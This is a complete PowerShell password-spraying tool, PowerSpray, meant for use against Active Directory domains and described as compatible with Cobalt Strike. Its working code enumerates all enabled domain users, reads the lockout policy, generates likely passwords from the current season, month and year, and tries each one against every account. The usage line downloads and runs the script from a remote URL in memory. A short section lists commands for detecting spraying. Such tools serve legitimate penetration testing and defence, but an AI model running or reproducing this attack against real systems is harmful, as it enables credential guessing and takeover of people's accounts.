 Function PowerSpray {
    <#

    .SYNOPSIS

        PowerSpray.ps1 Function: PowerSpray
        Author: John Cartrett (@jnqpblc)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        This module is a simple script to perform a password spraying attack against all users of a domain using LDAP and is compatible with Cobaltstrike.
        By default it will automatically generate the UserList from the domain.
        By default it will automatically generate the PasswordList using the current date.
        Be careful not to lockout any accounts.

	PS C:\> IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/jnqpblc/Misc-PowerShell/master/PowerSpray.ps1"); PowerSpray

    .LINK

        https://github.com/tallmega/PowerSpray
        https://serverfault.com/questions/276098/check-if-user-password-input-is-valid-in-powershell-script
        https://social.technet.microsoft.com/wiki/contents/articles/4231.working-with-active-directory-using-powershell-adsi-adapter.aspx
	https://www.trimarcsecurity.com/single-post/2018/05/06/Trimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing
        https://blog.fox-it.com/2017/11/28/further-abusing-the-badpwdcount-attribute/
	
    .DETECTION
    
    	[DC01] PS C:\> Get-ADUser -LDAPFilter "(&(objectClass=User)(badPasswordTime=*))" -Prop lastbadpasswordattempt,badpwdcount | Select-Object name,lastbadpasswordattempt,badpwdcount | Sort-Object lastbadpasswordattempt,badpwdcount | format-table -auto                                        
    	[DC01] PS C:\> $Date = (Get-Date).AddDays(-1); Get-WinEvent -FilterHashTable @{ LogName = "Security"; StartTime = $Date; ID = 4776 }
    	https://www.trimarcsecurity.com/single-post/2018/05/06/Trimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing

    .PARAMETER Passwords

        A comma-separated list of passwords to use instead of the internal list generator.

    .PARAMETER Seeds

        A comma-separated list of passwords to as a seed to the internal list generator.

    .PARAMETER Delay

        The delay time between guesses in millisecounds.

    .PARAMETER Sleep

        The number of minutes to sleep between password cycles.

    .EXAMPLE

        PowerSpray
        PowerSpray -Delay 1000 -Sleep 10
        PowerSpray -Seeds Password,Welcome,Cougars,Football
        PowerSpray -Passwords "Password1,Password2,Password1!,Password2!"

    #> 
    param (
    	[parameter(Mandatory=$false, HelpMessage="A comma-separated list of passwords to use instead of the internal list generator.")]
    	[string]$Passwords,
    	[parameter(Mandatory=$false, HelpMessage="A comma-separated list of passwords to as a seed to the internal list generator.")]
    	[string]$Seeds,
    	[parameter(Mandatory=$false, HelpMessage="The delay time between guesses in millisecounds.")]
    	[int]$Delay,
    	[parameter(Mandatory=$false, HelpMessage="The number of minutes to sleep between password cycles.")]
    	[int]$Sleep
    )
    
    $LogonServer = (Get-Item Env:LOGONSERVER).Value.TrimStart('\\')
    if ([string]::IsNullOrEmpty($LogonServer))
    {
        Write-Output "[-] Failed to retrieve the LOGONSERVER the environment variable; the script will exit."
        Break
    }

    Try {
        $objPDC = [ADSI] "LDAP://$([System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().InterSiteTopologyGenerator.Name)";
        $Searcher = New-Object DirectoryServices.DirectorySearcher;
        $Searcher.Filter = '(&(objectCategory=Person)(sAMAccountName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))';
        $Searcher.PageSize = 1000;
        $Searcher.PropertiesToLoad.Add("sAMAccountName") > $Null
        $Searcher.SearchRoot = $objPDC;
        $UserList = $Searcher.FindAll().Properties.samaccountname
    } Catch {
        Write-Output "[-] Failed to find or connect to Active Directory; the script will exit."
        Break
    }

    if (([string]::IsNullOrEmpty($UserList))) {
        Write-Output "[-] Failed to retrieve the usernames from Active Directory; the script will exit."
        Break
    } else {
        $UserCount = ($UserList).Count
        Write-Output "[+] Successfully collected $UserCount usernames from Active Directory."
        $lockoutThreshold = [int]$objPDC.lockoutThreshold.Value
        Write-Output "[*] The Lockout Threshold for the current domain is $($lockoutThreshold)."
        $minPwdLength = [int]$objPDC.minPwdLength.Value
        Write-Output "[*] The Min Password Length for the current domain is $($minPwdLength)."
    }

    $SeedList = @()
    $PasswordList = @()

    if ($PSBoundParameters.ContainsKey('Passwords')) {
        $PasswordList = $Passwords -split ','
    } elseif ($PSBoundParameters.ContainsKey('Seeds')) {
        $SeedList = $Seeds -split ','
        $PasswordList = Generate-Passwords($SeedList)
    } else {
        $SeasonList = @((Get-Season $((Get-Date).AddMonths(-1))), (Get-Season $(Get-Date)), (Get-Season $((Get-Date).AddMonths(1))))
        $SeasonList = $SeasonList |Sort-Object -Unique
        $MonthList = @((Get-Culture).DateTimeFormat.GetMonthName((Get-Date).AddMonths(-1).Month), (Get-Culture).DateTimeFormat.GetMonthName((Get-Date).Month), (Get-Culture).DateTimeFormat.GetMonthName((Get-Date).AddMonths(1).Month))
        $SeedList = $SeasonList + $MonthList
        $PasswordList = Generate-Passwords($SeedList)
    }
    if (([string]::IsNullOrEmpty($PasswordList))) {
        Write-Output "[-] The PasswordList variable is empty; the script will exit."
        Break
    }
    Write-Output "[+] Successfully generated a list of $($PasswordList.Count) passwords."

    Write-Output "[*] Starting password spraying operations."
    foreach ($Password in $PasswordList)
    {
        Write-Output "[*] Using password $Password"
        foreach ($UserName in $UserList)
        {
            $CurrentDomain = "LDAP://" + $LogonServer;
            if (([string]::IsNullOrEmpty($CurrentDomain)))
            {
                Write-Output "[-] Failed to retrieve the domain name; the script will exit."
                Break
            }

            $Domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $UserName, $Password)

            if ($Domain.Name -eq $null)
            {
                # Write-Output "[-] Authentication failed with $UserName::$Password"
            } else {
                Write-Output "[+] Successfully authenticated with $UserName::$Password"
            }
            
            if ($PSBoundParameters.ContainsKey('Delay')) {
                Start-Sleep -Milliseconds $Delay
            } else {
                Start-Sleep -Milliseconds 1000
            }
        }
        Write-Output "[*] Completed all rounds with password $Password"
        
        if ($PSBoundParameters.ContainsKey('Sleep')) {
            $Duration = (New-Timespan -Minutes $Sleep).TotalSeconds
            Write-Output "[*] Now the script will sleep for $Duration seconds."
            Start-Sleep -Seconds $Duration
        }
    }
    Write-Output "[*] Completed all password spraying operations."
}

Function Get-Season() {
    param (
        [parameter(Mandatory=$true, HelpMessage="Enter a datetime.")]
	    [datetime]$Date
    ) 

    $Winter = Get-Date "01/01/$((Get-Date).Year)"
    $Spring = Get-Date "03/20/$((Get-Date).Year)"
    $Summer = Get-Date "06/21/$((Get-Date).Year)"
    $Autumn = Get-Date "09/22/$((Get-Date).Year)"
    $Winter2 = Get-Date "12/21/$((Get-Date).Year)"
 
    if (($Date -ge $Winter) -and ($Date -le $Spring)) {return "Winter"}
    elseif (($Date -ge $Spring) -and ($Date -le $Summer)) {return "Spring"}
    elseif (($Date -ge $Summer) -and ($Date -le $Autumn)) {return "Summer"}
    elseif (($Date -ge $Autumn) -and ($Date -le $Winter2)) {return "Autumn"}
    elseif (($Date -ge $Winter2) -and ($Date -le $Spring.AddYears(1))) {return "Winter"}
    else {return "Eneter a datetime."}
}

Function Generate-Passwords($SeedList) {
    if (([string]::IsNullOrEmpty($SeedList))) {
        Write-Output "[-] The SeedList variable is empty; the script will exit."
        Break
    } else {
        $PasswordList = @()
        $AppendList = @((Get-Date -UFormat %y), "$(Get-Date -UFormat %y)!", ((Get-Date).Year), "$((Get-Date).Year)!", "1", "2", "3", "1!", "2!", "3!", "123", "1234", "123!", "1234!")
        foreach ($Seed in $SeedList)
        {
            foreach ($Item in $AppendList)
            { 
                $Candidate = $Seed + $Item
                if ($Candidate.length -ge $minPwdLength) {
                    $PasswordList += $Candidate
                }
            }
        }
        return $PasswordList
    }
}  
